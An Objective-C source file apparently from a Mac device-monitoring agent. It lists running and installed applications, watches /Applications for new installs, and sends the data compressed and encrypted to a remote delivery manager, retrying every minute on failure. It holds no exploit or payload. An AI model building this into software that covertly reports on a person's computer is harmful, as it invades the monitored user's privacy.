//
//  ApplicationManagerForMacImpl.m
//  ApplicationManagerForMac
//
//  Created by Benjawan Tanarattanakorn on 10/21/13.
//  Copyright (c) 2013 __MyCompanyName__. All rights reserved.
//

#import "ApplicationManagerForMacImpl.h"
#import "DeliveryRequest.h"
#import "DeliveryResponse.h"
#import "EventDeliveryManager.h"
#import "SendRunningApplication.h"
#import "SendInstalledApplication.h"
#import "RunningApplicationDataProvider.h"
#import "InstalledApplicationDataProvider.h"
#import "ApplicationDelegate.h"
#import "InstalledAppNotifier.h"

static NSInteger kCSMConnectionTimeout			= 60;		// 1 minute
static NSInteger kRunningAppEventMaxRetry		= 5;		// 5 times
static NSInteger kRunningAppEventDelayRetry		= 60;		// 1 minute

static NSInteger kInstalledAppEventMaxRetry		= 5;		// 5 times
static NSInteger kInstalledAppEventDelayRetry	= 60;		// 1 minute


@interface ApplicationManagerForMacImpl (private)
- (DeliveryRequest*) runningAppRequest;
- (DeliveryRequest*) installedAppRequest;
- (void) prerelease;
@end



@implementation ApplicationManagerForMacImpl

- (id) initWithDDM: (id <DataDelivery>) aDDM {
	self = [super init];
	if (self != nil) {
		mDDM = aDDM;
		mRunningAppDataProvider = [[RunningApplicationDataProvider alloc] init];
		mInstalledAppDataProvider = [[InstalledApplicationDataProvider alloc] init];
        mInstalledAppNotifier =  [[InstalledAppNotifier alloc] initWithPathToWatch:@"/Applications"];
        [mInstalledAppNotifier setMDelegate:self];
        mInstalledAppNotifier.mSelector = @selector(callbackFromInstalledAppNotifier:);
		if ([mDDM isRequestPendingForCaller:kDDC_RunningInstalledAppsManager]) {
			[mDDM registerCaller:kDDC_RunningInstalledAppsManager withListener:self];
		}
	}

	return self;
}


#pragma mark ApplicationManager protocol

-(void) callbackFromInstalledAppNotifier: (NSArray *) bundlePaths {
    NSArray *allBundlePaths = [bundlePaths arrayByAddingObjectsFromArray:mInstalledAppDataProvider.mNewBundlePaths];
    mInstalledAppDataProvider.mNewBundlePaths = allBundlePaths;
    [self deliverInstalledApplication:nil];
}

- (BOOL) deliverRunningApplication: (id <RunningApplicationDelegate>) aDelegate {
	DLog(@"deliverRunningApplication, aDelegate = %@", aDelegate)
	BOOL canProcess = NO;
	DeliveryRequest* request = [self runningAppRequest];
	if (![mDDM isRequestIsPending:request]) {
		DLog (@"not pending")
		// SendRunningApplication is in ProtocolBuider
		SendRunningApplication* runningApp = [mRunningAppDataProvider commandData];
		[request setMCommandCode:[runningApp getCommand]]; 
		[request setMCompressionFlag:1];
		[request setMEncryptionFlag:1];
		[request setMCommandData:runningApp];
		[request setMDeliveryListener:self];
		[mDDM deliver:request];
		
		mRunningAppDelegate = aDelegate;				// set delegate
		
		canProcess = YES;
	}
	return canProcess;
}

// ApplicationManager protocol
- (BOOL) deliverInstalledApplication: (id <InstalledApplicationDelegate>) aDelegate {
	DLog(@"deliverInstalledApplication, aDelegate = %@", aDelegate);
	BOOL canProcess = NO;
	DeliveryRequest* request = [self installedAppRequest];
	if (![mDDM isRequestIsPending:request]) {
		DLog (@"not pending")
		// SendInstalledApplication is in ProtocolBuider
		SendInstalledApplication* installedApp = [mInstalledAppDataProvider commandData];
		[request setMCommandCode:[installedApp getCommand]]; 
		[request setMCompressionFlag:1];
		[request setMEncryptionFlag:1];
		[request setMCommandData:installedApp];
		[request setMDeliveryListener:self];
		[mDDM deliver:request];
		
		mInstalledAppDelegate = aDelegate;				// set delegate
		
		canProcess = YES;
	}
	return canProcess;	
}


#pragma mark DeliveryListener protocol

// called by DDM
- (void) requestFinished: (DeliveryResponse*) aResponse {
	DLog(@"ApplicationManagerImpl --> requestFinished: aResponse.mSuccess: %d", [aResponse mSuccess])
	
	id <RunningApplicationDelegate> runningAppdelegate = nil;
	id <InstalledApplicationDelegate> installedAppdelegate = nil;
	
	if ([aResponse mSuccess]) {
		// callback to a application delegate
		if ([aResponse mEDPType] == kEDPTypeSendRunningApps) {						// Running App
			DLog (@">>>> requestFinished: kEDPTypeSendRunningApps")
			runningAppdelegate = mRunningAppDelegate;
			mRunningAppDelegate = nil;
			if ([runningAppdelegate respondsToSelector:@selector(deliverRunningApplicationDidFinished:)]) 
				[runningAppdelegate deliverRunningApplicationDidFinished:nil];
		} else if ([aResponse mEDPType] == kEDPTypeSendInstalledApps) {				// Installed App
			DLog (@">>>> requestFinished: kEDPTypeSendInstalledApps")
			installedAppdelegate = mInstalledAppDelegate;
			mInstalledAppDelegate = nil;
			if ([installedAppdelegate respondsToSelector:@selector(deliverInstalledApplicationDidFinished:)]) 
				[installedAppdelegate deliverInstalledApplicationDidFinished:nil];
		}
	} else {
		if ([aResponse mEDPType] == kEDPTypeSendRunningApps) {						// Running App
			DLog (@"not success")
			runningAppdelegate = mRunningAppDelegate;
			mRunningAppDelegate = nil;
			if ([runningAppdelegate respondsToSelector:@selector(deliverRunningApplicationDidFinished:)])	{		
				DLog (@">>>> requestFinished: kEDPTypeSendRunningApps")
				NSError *error = [NSError errorWithDomain:@"Send Running Application" 
													 code:[aResponse mStatusCode] 
												 userInfo:nil];								
				[runningAppdelegate deliverRunningApplicationDidFinished:error];
			}
			// Requirement: retry every one minute if fail
			[self performSelector:@selector(deliverRunningApplication:)
					   withObject:nil
					   afterDelay:60];
		} else if ([aResponse mEDPType] == kEDPTypeSendInstalledApps) {				// Installed App
			DLog (@">>>> requestFinished: kEDPTypeSendInstalledApps")
			installedAppdelegate = mInstalledAppDelegate;
			mInstalledAppDelegate = nil;
			if ([installedAppdelegate respondsToSelector:@selector(deliverInstalledApplicationDidFinished:)]) {
				NSError *error = [NSError errorWithDomain:@"Send Installed Application" 
													 code:[aResponse mStatusCode] 
												 userInfo:nil];					
				[installedAppdelegate deliverInstalledApplicationDidFinished:error];
			}
			// Requirement: retry every one minute if fail
			[self performSelector:@selector(deliverInstalledApplication:)
					   withObject:nil
					   afterDelay:60];
		}
	}
}

- (void) updateRequestProgress: (DeliveryResponse*) aResponse {
	DLog(@"Update progress aResponse = %@", aResponse)
}


#pragma mark Private methods

- (DeliveryRequest*) runningAppRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_RunningInstalledAppsManager];		// same for installed and running app
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:kRunningAppEventMaxRetry];
    [request setMEDPType:kEDPTypeSendRunningApps];
    [request setMRetryTimeout:kRunningAppEventDelayRetry];
    [request setMConnectionTimeout:kCSMConnectionTimeout];
	[request autorelease];
	return request;
}

- (DeliveryRequest*) installedAppRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_RunningInstalledAppsManager];		// same for installed and running app
    [request setMPriority:kDDMRequestPriortyNormal];	
    [request setMMaxRetry:kInstalledAppEventMaxRetry];
    [request setMEDPType:kEDPTypeSendInstalledApps];
    [request setMRetryTimeout:kInstalledAppEventDelayRetry];
    [request setMConnectionTimeout:kCSMConnectionTimeout];
	[request autorelease];
	return request;
}

- (void) prerelease {
	// If both requests are failed, previous timer can cancel the last timer (issue of more than one timer in this class)
	[NSObject cancelPreviousPerformRequestsWithTarget:self
											 selector:@selector(deliverInstalledApplication:)
											   object:nil];
	[NSObject cancelPreviousPerformRequestsWithTarget:self
											 selector:@selector(deliverRunningApplication:)
											   object:nil];
}

#pragma mark -
#pragma mark Memory management
#pragma mark -

- (void) dealloc {
	[mRunningAppDataProvider release];
	[mInstalledAppDataProvider release];
    [mInstalledAppNotifier prepareForRelease];
    [mInstalledAppNotifier release];
	[super dealloc];
}

@end
